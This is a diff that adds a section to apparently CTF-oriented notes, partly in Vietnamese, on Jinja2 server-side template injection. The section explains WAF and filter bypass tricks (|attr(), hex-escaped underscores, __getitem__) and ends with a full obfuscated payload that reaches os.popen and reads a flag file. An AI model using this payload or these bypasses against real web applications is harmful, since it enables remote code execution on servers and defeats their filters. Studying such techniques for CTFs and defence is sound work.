@@ -55,3 +55,34 @@ ${7*7}
 	- `.read()`
 		- Đọc toàn bộ output từ pipe (kết quả của lệnh `id`).
 		- Lệnh `id` sẽ in ra user, group, quyền hiện tại của process server.
+  #### Key Bypass Techniques
+##### 1. Avoiding Dot Notation (`.`) → Uses `|attr()` to dynamically access attributes:
+
+request|attr(‘application’)|attr(“__globals__”)
+
+— Bypasses WAFs blocking `request.application.__globals__`.
+
+    ##### 2. Hex Encoding (`\x5f`) for Underscores (`_`)
+
+    “\x5f\x5fglobals\x5f\x5f”
+
+    — Bypasses filters blocking `__globals__`, `__builtins__`, and `__import__`.
+
+    ##### 3. Using `__getitem__()` Instead of `[]`
+    jinja2
+    |attr(‘__getitem__’)(‘__builtins__’)
+
+    — Evades protections blocking `__builtins__[‘__import__’]`.
+
+##### 4. Jinja2 Sandbox Escape
+— Accesses `request.application.__globals__` to get Python built-ins.
+
+   ##### 5. RCE Without `eval()` or `exec()`
+
+    __import__(‘os’).popen(‘id’).read()
+
+    — Avoids blocked `os.system()` and `subprocess.Popen()`.
+  - payload:
+```
+{{request|attr(‘application’)|attr(“\x5f\x5fglobals\x5f\x5f”)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(‘\x5f\x5fbuiltins\x5f\x5f’)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(“\x5f\x5fimport\x5f\x5f”)(‘os’)|attr(‘popen’)(‘cat flag’)|attr(‘read’)()}}
+```
